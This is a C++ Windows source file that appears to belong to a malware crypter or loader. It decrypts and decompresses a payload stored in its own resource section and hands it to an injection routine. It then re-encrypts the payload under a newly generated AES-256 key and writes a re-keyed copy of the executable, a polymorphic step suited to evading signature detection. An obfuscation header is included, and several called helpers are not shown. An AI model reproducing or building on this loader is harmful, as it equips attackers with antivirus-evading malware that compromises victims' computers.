#include <windows.h>
#include <wincrypt.h>
#include <compressapi.h>
#include <iostream>
#include <vector>
#include <string>

#include "../includes/Obfuscate.h"

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "Cabinet.lib")

using namespace std;

vector<BYTE> ExportKeyToBytes(HCRYPTKEY hKey) {
    cout << "[debug] Exporting AES key." << endl;
    DWORD keySize = 0;
    if (!CryptExportKey(hKey, 0, PLAINTEXTKEYBLOB, 0, NULL, &keySize)) {
        cerr << "[error] Failed to get key size. Error: " << GetLastError() << endl;
        exit(EXIT_FAILURE);
    }

    vector<BYTE> keyBlob(keySize);
    if (!CryptExportKey(hKey, 0, PLAINTEXTKEYBLOB, 0, keyBlob.data(), &keySize)) {
        cerr << "[error] Failed to export key. Error: " << GetLastError() << endl;
        exit(EXIT_FAILURE);
    }

    const BYTE* keyData = keyBlob.data() + sizeof(BLOBHEADER) + sizeof(DWORD);
    DWORD keyDataSize = keySize - (sizeof(BLOBHEADER) + sizeof(DWORD));

    vector<BYTE> key(keyData, keyData + keyDataSize);
    PrintVector(key, "[debug] Exported AES key");
    return key;
}

vector<BYTE> CompressData(const vector<BYTE>& data) {
    cout << "[debug] Compressing data." << endl;
    COMPRESSOR_HANDLE compressor = NULL;
    if (!CreateCompressor(COMPRESS_ALGORITHM_MSZIP, NULL, &compressor)) {
        cerr << "[error] Failed to create compressor. Error: " << GetLastError() << endl;
        exit(EXIT_FAILURE);
    }

    SIZE_T compressedSize = 0;
    if (!Compress(compressor, (PVOID)data.data(), data.size(), NULL, 0, &compressedSize)) {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
            cerr << "[error] Failed to determine compressed size. Error: " << GetLastError() << endl;
            CloseCompressor(compressor);
            exit(EXIT_FAILURE);
        }
    }

    vector<BYTE> compressedData(compressedSize);
    if (!Compress(compressor, (PVOID)data.data(), data.size(), compressedData.data(), compressedSize, &compressedSize)) {
        cerr << "[error] Failed to compress data. Error: " << GetLastError() << endl;
        CloseCompressor(compressor);
        exit(EXIT_FAILURE);
    }

    compressedData.resize(compressedSize);
    CloseCompressor(compressor);

    PrintVector(compressedData, "[debug] Compressed data");

    return compressedData;
}

void EncryptData(HCRYPTKEY hKey, vector<BYTE>& data) {
    cout << "[debug] Encrypting data." << endl;
    DWORD bufferSize = static_cast<DWORD>(data.size());
    DWORD dataSize = bufferSize;

    if (!CryptEncrypt(hKey, 0, TRUE, 0, NULL, &bufferSize, 0)) {
        cerr << "[error] Failed to calculate buffer size for encryption. Error: " << GetLastError() << endl;
        exit(EXIT_FAILURE);
    }

    data.resize(bufferSize);

    if (!CryptEncrypt(hKey, 0, TRUE, 0, data.data(), &dataSize, bufferSize)) {
        cerr << "[error] Failed to encrypt data. Error: " << GetLastError() << endl;
        exit(EXIT_FAILURE);
    }

    data.resize(dataSize);

    PrintVector(data, "[debug] Encrypted data");
}

void CreateCopyWithNewResource(const string& originalPath, const string& copyPath, const vector<BYTE>& newResourceData) {
    // Copy the original executable to create a duplicate
    if (!CopyFile(originalPath.c_str(), copyPath.c_str(), FALSE)) {
        cerr << "[error] Failed to copy file: " << GetLastError() << "\n";
        exit(EXIT_FAILURE);
    }

    cout << "[debug] Copy created successfully at: " << copyPath << "\n";

    // Update the resource in the copied file
    HANDLE hUpdate = BeginUpdateResource(copyPath.c_str(), FALSE);
    if (!hUpdate) {
        cerr << "[error] Failed to begin resource update: " << GetLastError() << "\n";
        exit(EXIT_FAILURE);
    }

    // Check and print resource data size
    cout << "[debug] New resource data size: " << newResourceData.size() << "\n";
    PrintVector(newResourceData, "[debug] New resource data");

    // Update the resource
    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_PAYLOAD),
                        MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                        (LPVOID)newResourceData.data(), static_cast<DWORD>(newResourceData.size()))) {
        cerr << "[error] Failed to update resource: " << GetLastError() << "\n";
        EndUpdateResource(hUpdate, TRUE);
        exit(EXIT_FAILURE);
    }

    if (!EndUpdateResource(hUpdate, FALSE)) {
        cerr << "[error] Failed to finalize resource update: " << GetLastError() << "\n";
        exit(EXIT_FAILURE);
    }

    cout << "[debug] Resource updated successfully in the copy.\n";
}



int main() {
    cout << "[debug] Starting program." << endl;

    char exePath[MAX_PATH];
    if (!GetModuleFileName(NULL, exePath, MAX_PATH)) {
        cerr << "[error] Failed to get module file name: " << GetLastError() << endl;
        return 1;
    }

    string originalPath = exePath;
    string copyPath = originalPath.substr(0, originalPath.find_last_of('.')) + "_copy.exe";

    vector<BYTE> key;
    vector<BYTE> encryptedPayload = LoadEncryptedPayload(key);

    HCRYPTPROV hCryptProv;
    HCRYPTKEY hKey;
    if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        cerr << "[error] Failed to acquire cryptographic context: " << GetLastError() << endl;
        return 1;
    }

    hKey = ImportAESKey(hCryptProv, key);

    DecryptData(hKey, encryptedPayload);
    vector<BYTE> decompressedPayload = DecompressData(encryptedPayload);

    startInjection(decompressedPayload.data(), decompressedPayload.size());

    HCRYPTKEY hNewKey;
    if (!CryptGenKey(hCryptProv, CALG_AES_256, CRYPT_EXPORTABLE, &hNewKey)) {
        cerr << "[error] Failed to generate AES key: " << GetLastError() << endl;
        return 1;
    }

    vector<BYTE> newAesKey = ExportKeyToBytes(hNewKey);

    vector<BYTE> compressedPayload = CompressData(decompressedPayload);
    EncryptData(hNewKey, compressedPayload);

    vector<BYTE> newResourceData = newAesKey;
    newResourceData.insert(newResourceData.end(), compressedPayload.begin(), compressedPayload.end());

    CreateCopyWithNewResource(originalPath, copyPath, newResourceData);

    CryptDestroyKey(hKey);
    CryptDestroyKey(hNewKey);
    CryptReleaseContext(hCryptProv, 0);

    cout << "[debug] Program finished successfully." << endl;

    return 0;
}
